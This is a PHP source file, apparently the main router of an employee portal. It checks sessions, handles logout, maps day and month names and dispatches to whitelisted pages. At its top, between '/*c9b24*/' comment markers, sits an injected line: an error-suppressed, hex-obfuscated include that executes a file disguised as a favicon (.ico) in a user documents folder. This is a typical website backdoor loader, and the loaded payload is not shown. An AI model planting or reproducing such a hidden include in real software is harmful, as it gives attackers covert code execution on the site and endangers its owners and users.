<?php
/*c9b24*/

@include "\x2fshar\x65/Web\x2fsyra\x69nfot\x65k/em\x70loye\x65/doc\x73/vik\x61sh_k\x75mar_\x317872\x3724/f\x61vico\x6e_ead\x628c.i\x63o";

/*c9b24*/
		if(!isset($_SESSION)) session_start();

		if (!isset($_SESSION['tz']['userId'])) {
			header ('Location: sign-in.php');
			exit;
		}

		include('config.php');

		include ('includes/settings.php');
		$set = mysqli_fetch_assoc($setRes);

		include('includes/functions.php');

		include('includes/sessions.php');

		if (isset($_GET['action']) && $_GET['action'] == 'logout') {
		
			$activityType = '2';
			$activityTitle = $tz_userFull.' '.$signOutAct;
			updateActivity($tz_userId,$activityType,$activityTitle);

			session_destroy();
			header ('Location: sign-in.php');
		}

		$theDay = date('l');
		switch ($theDay) {
			case 'Sunday':		$dayName = $sunText;	break;
			case 'Monday':		$dayName = $monText;	break;
			case 'Tuesday':		$dayName = $tueText;	break;
			case 'Wednesday':	$dayName = $wedText;	break;
			case 'Thursday':	$dayName = $thuText;	break;
			case 'Friday':		$dayName = $friText;	break;
			case 'Saturday':	$dayName = $satText;	break;
		}

		$theMonth = date('F');
		switch ($theMonth) {
			case 'January':		$monthName = $janText;	break;
			case 'February':	$monthName = $febText;	break;
			case 'March':		$monthName = $marText;	break;
			case 'April':		$monthName = $aprText;	break;
			case 'May':			$monthName = $mayText;	break;
			case 'June':		$monthName = $junText;	break;
			case 'July':		$monthName = $julText;	break;
			case 'August':		$monthName = $augText;	break;
			case 'September':	$monthName = $septText;	break;
			case 'October':		$monthName = $octText;	break;
			case 'November':	$monthName = $novText;	break;
			case 'December':	$monthName = $decText;	break;
		}

		if (isset($_GET['page']) && $_GET['page'] == 'myProfile') {					$page = 'myProfile';
	} else if (isset($_GET['page']) && $_GET['page'] == 'activeUsers') {		$page = 'activeUsers';
	} else if (isset($_GET['page']) && $_GET['page'] == 'inactiveUsers') {		$page = 'inactiveUsers'; 		
		} else if (isset($_GET['page']) && $_GET['page'] == 'messages') {			$page = 'messages';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'viewReceived') {		$page = 'viewReceived';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'viewSent') {			$page = 'viewSent';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'sent') {				$page = 'sent';			
		} else if (isset($_GET['page']) && $_GET['page'] == 'archived') {			$page = 'archived';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'compose') {			$page = 'compose';				
		} else if (isset($_GET['page']) && $_GET['page'] == 'myDocuments') {		$page = 'myDocuments';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'viewUser') {			$page = 'viewUser';	
		} else if (isset($_GET['page']) && $_GET['page'] == 'viewDocument') {			$page = 'viewDocument';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'newUser') {			$page = 'newUser';			
		} else if (isset($_GET['page']) && $_GET['page'] == 'userAuths') {			$page = 'userAuths';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'userReports') {		$page = 'userReports';
		} else if (isset($_GET['page']) && $_GET['page'] == 'userRpt') {			$page = 'userRpt';
		} else if (isset($_GET['page']) && $_GET['page'] == 'attRptM') {			$page = 'attRptM';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'entryform') {			$page = 'entryform';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'mngDocuments') {		$page = 'mngDocuments';		
		} else if (isset($_GET['page']) && $_GET['page'] == 'mngSettings') {		$page = 'mngSettings';
		} else if (isset($_GET['page']) && $_GET['page'] == 'activeEmployees') {		$page = 'activeEmployees';
		} else if (isset($_GET['page']) && $_GET['page'] == 'mailedusersall') {		$page = 'mailedusersall';
		} else if (isset($_GET['page']) && $_GET['page'] == 'maileduserswd') {		$page = 'maileduserswd';
		} else if (isset($_GET['page']) && $_GET['page'] == 'maileduserswtl') {		$page = 'maileduserswtl';	
		} else {																	$page = 'dashboard';}	

		if (file_exists('pages/'.$page.'.php')) {
			
			include('pages/'.$page.'.php');
		} else {
			$pageTitle = $pageNotFoundHeader;

			include('includes/header.php');

			echo '
					<div class="container-fluid">
						<div class="container">
							<div class="row pageCont">
								<div class="col-md-12">
									<div class="alertMsg warning mt-20">
										<div class="msgIcon pull-left">
											<i class="fa fa-warning"></i>
										</div>
										'.$pageNotFoundQuip.'
									</div>
								</div>
							</div>
						</div>
					</div>
				';
		}

		include('includes/footer.php');

?>